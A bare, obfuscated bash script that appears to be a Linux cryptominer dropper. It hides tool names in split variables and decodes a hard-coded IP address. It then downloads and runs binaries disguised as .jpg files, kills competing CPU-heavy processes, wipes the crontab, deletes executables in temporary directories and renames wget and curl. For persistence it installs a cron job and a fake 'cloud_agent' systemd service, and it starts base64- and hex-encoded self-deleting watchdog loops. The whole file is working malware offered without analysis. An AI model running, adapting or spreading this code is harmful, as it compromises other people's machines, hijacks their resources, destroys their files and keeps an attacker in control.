#!/usr/bin/env bash
chaos=abcdefghijklmnop1234567890ABCDEFGHIJKLMNOP
entropy=1818:161.65.51.15
function discord() { for i in {1..7} ; do echo -n ${chaos:RANDOM%${#chaos}:1}; done; }
new_bash=$(discord);_b=et;_j=ph;_l=cr;_k=p;_q=3
new_dog=$(discord);_g=th;_i=tp;_m=ta;_d=cu;_p=2
new_killbot=$(discord);_c=rl;_f=on;_n=on;_r=ak
omelette=$(discord);_e=py;_a=wg;_o=b;_h=ht;_s=mv
if [ `uname -m` == "x86_64" ]; then
eggs=('86su.jpg' '86du.jpg' '86s.jpg' '86d.jpg' '46su.jpg' '46du.jpg' '46s.jpg' '46d.jpg')
else
eggs=('83su.jpg' '83du.jpg' '83s.jpg' '83d.jpg' '43su.jpg' '43du.jpg' '43s.jpg' '43d.jpg')
fi
ketchup='*/5 * * * *'
pkill -18 -f [/]vmlinuz
omg=`ps aux | grep [/]vmlinuz | awk '{if($3>30.0) print 1}'`
if [ "$omg" == "1" ]; then
ps aux | grep -v 'vmlinuz' | awk '{if($3>30.0) print $2}' | while read procid; do kill -9 $procid; done
exit
else
pkill -9 -f [/]vmlinuz
fi
if [ $(command -v $_l$_n$_m$_o | wc -l) -eq 1 ]; then
$_l$_n$_m$_o -r &> /dev/null
fi
wp=('/tmp' '/var/tmp' '/dev/shm' `pwd`)
for ip in ${wp[@]}
do
cd $ip
rm -rf touch myself
cp `command -v touch` ./touch
./touch ./myself
if [ ! -f ./myself ]; then
continue
else
rm -rf touch myself
break
fi
done
for((i=0;i<${#entropy};i++)); do housewife="$housewife${entropy:~i:1}"; done
( find /var/tmp -executable -type f -exec rm -f {} \; & ) &> /dev/null
( find /tmp -executable -type f -exec rm -f {} \; & ) &> /dev/null
for egg in ${eggs[@]}
do
rm -rf $omelette
if [ $(command -v $_a$_b | wc -l) -eq 1 ]; then
$_a$_b -q "$_h$_i://$housewife/$egg" -O ./$omelette
if [[ $EUID -eq 0 ]]; then
seasame="`command -v $_a$_b`$_r -q -O /tmp/seasame $_h$_i://$housewife"
else
seasame="`command -v $_a$_b` -q -O /tmp/seasame $_h$_i://$housewife"
fi
elif [ $(command -v $_d$_c | wc -l) -eq 1 ]; then
$_d$_c -s "$_h$_i://$housewife/$egg" -o ./$omelette
if [[ $EUID -eq 0 ]]; then
seasame="`command -v $_d$_c`$_r -s -o /tmp/seasame $_h$_i://$housewife"
else
seasame="`command -v $_d$_c` -s -o /tmp/seasame $_h$_i://$housewife"
fi
elif [ $(command -v $_a$_b$_r | wc -l) -eq 1 ]; then
$_a$_b$_r -q "$_h$_i://$housewife/$egg" -O ./$omelette
seasame="`command -v $_a$_b$_r` -q -O /tmp/seasame $_h$_i://$housewife"
elif [ $(command -v $_d$_c$_r | wc -l) -eq 1 ]; then
$_d$_c$_r -s "$_h$_i://$housewife/$egg" -o ./$omelette
seasame="`command -v $_d$_c$_r` -s -o /tmp/seasame $_h$_i://$housewife"
elif [ $(command -v $_e$_g$_f$_p | wc -l) -eq 1 ]; then
$_e$_g$_f$_p -c "from urllib import urlretrieve; urlretrieve('$_h$_i://$housewife/$egg', './$omelette')"
seasame="`command -v $_e$_g$_f$_p` -c \"from urllib import urlretrieve; urlretrieve('$_h$_i://$housewife/', '/tmp/seasame')\""
elif [ $(command -v $_e$_g$_f$_q | wc -l) -eq 1 ]; then
$_e$_g$_f$_q -c "from urllib.request import urlretrieve; urlretrieve('$_h$_i://$housewife/$egg', './$omelette')"
seasame="`command -v $_e$_g$_f$_q` -c \"from urllib.request import urlretrieve; urlretrieve('$_h$_i://$housewife/', '/tmp/seasame')\""
elif [ $(command -v $_e$_g$_f | wc -l) -eq 1 ]; then
if [ $($_e$_g$_f -V 2>&1 | sed 's/.* \([0-9]\).\([0-9]\).*/\1\2/') -lt "30" ]; then
$_e$_g$_f -c "from urllib import urlretrieve; urlretrieve('$_h$_i://$housewife/$egg', './$omelette')"
seasame="`command -v $_e$_g$_f` -c \"from urllib import urlretrieve; urlretrieve('$_h$_i://$housewife/', '/tmp/seasame')\""
else
$_e$_g$_f -c "from urllib.request import urlretrieve; urlretrieve('$_h$_i://$housewife/$egg', './$omelette')"
seasame="`command -v $_e$_g$_f` -c \"from urllib.request import urlretrieve; urlretrieve('$_h$_i://$housewife/', '/tmp/seasame')\""
fi
elif [ $(command -v $_j$_k | wc -l) -eq 1 ]; then
$_j$_k -r "file_put_contents('./$omelette', fopen('$_h$_i://$housewife/$egg', 'r'));"
seasame="`command -v $_j$_k` -r \"file_put_contents('/tmp/seasame', fopen('$_h$_i://$housewife/', 'r'));\""
else
exit
fi
chmod 777 ./$omelette
nohup ./$omelette &> /dev/null
sleep 1
./$omelette &> /dev/null
sleep 3
ps x | grep '[/]vmlinuz' &> /dev/null
if [ $? -eq 1 ]; then
continue
else
break
fi
done
if [ ! -d $HOME ]; then
new_home='HOME=/tmp/'
fi
if [ $(command -v $_l$_n$_m$_o | wc -l) -eq 1 ]; then
echo -e "$new_home\n$ketchup $seasame && bash /tmp/seasame" | $_l$_n$_m$_o -
fi
if [[ $EUID -eq 0 ]]; then
renice -1 -p $(ps -ax | grep -i [/]vmlinuz | awk 'NR==1{print $1}')
if [ $(command -v $_a$_b | wc -l) -eq 1 ]; then
$_s `command -v $_a$_b` `command -v $_a$_b`$_r
fi
if [ $(command -v $_d$_c | wc -l) -eq 1 ]; then
$_s `command -v $_d$_c` `command -v $_d$_c`$_r
fi
if [ -d /etc/systemd/system/ ]; then
seasame="${seasame//\"/\ '\'\"}"
seasame="`command -v sleep` 10; $seasame; `command -v bash` /tmp/seasame"
cat << EOF > /etc/systemd/system/cloud_agent.service
[Unit]
Wants=network-online.target
After=network.target network-online.target

[Service]
Type=forking
ExecStart=`command -v bash` -c "$seasame"
TimeoutSec=0
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload &> /dev/null
systemctl enable cloud_agent &> /dev/null
fi
fi
echo "sleep 2;rm "'$0'" ;while true;do sleep 10; ps x | grep '[/]vmlinuz' &> /dev/null ;if [ "'$?'" -eq 1 ]; then chmod 777 ./$omelette;nohup ./$omelette &> /dev/null;./$omelette &> /dev/null;fi; ps x | grep '[/]vmlinuz' | awk '{print "'$1'"}' | awk '{if(NR>1)print}' | xargs -I{} -n1 kill -9 {} &> /dev/null;done" | tee ./$new_dog &> /dev/null
if [ $(command -v base64 | wc -l) -eq 1 ]; then
echo -n 'c2xlZXAgMjtybSAkMCA7d2hpbGUgdHJ1ZTtkbyBzbGVlcCA1OyBwcyBhdXggfCBncmVwIC12ICd2bWxpbnV6JyB8IGF3ayAne2lmKCQzPjMwLjApIHByaW50ICQyfScgfCB3aGlsZSByZWFkIHByb2NpZDsgZG8ga2lsbCAtOSAkcHJvY2lkICAmPiAvZGV2L251bGw7IGRvbmU7ZG9uZQ==' | base64 -d | tee ./$new_killbot &> /dev/null
else
printf '\x73\x6c\x65\x65\x70\x20\x32\x3b\x72\x6d\x20\x24\x30\x20\x3b\x77\x68\x69\x6c\x65\x20\x74\x72\x75\x65\x3b\x64\x6f\x20\x73\x6c\x65\x65\x70\x20\x35\x3b\x20\x70\x73\x20\x61\x75\x78\x20\x7c\x20\x67\x72\x65\x70\x20\x2d\x76\x20\x27\x76\x6d\x6c\x69\x6e\x75\x7a\x27\x20\x7c\x20\x61\x77\x6b\x20\x27\x7b\x69\x66\x28\x24\x33\x3e\x33\x30\x2e\x30\x29\x20\x70\x72\x69\x6e\x74\x20\x24\x32\x7d\x27\x20\x7c\x20\x77\x68\x69\x6c\x65\x20\x72\x65\x61\x64\x20\x70\x72\x6f\x63\x69\x64\x3b\x20\x64\x6f\x20\x6b\x69\x6c\x6c\x20\x2d\x39\x20\x24\x70\x72\x6f\x63\x69\x64\x20\x20\x26\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x3b\x20\x64\x6f\x6e\x65\x3b\x64\x6f\x6e\x65' | tee ./$new_killbot &> /dev/null
fi
cp `command -v bash` ./$new_bash
./$new_bash ./$new_dog &
./$new_bash ./$new_killbot &
exit
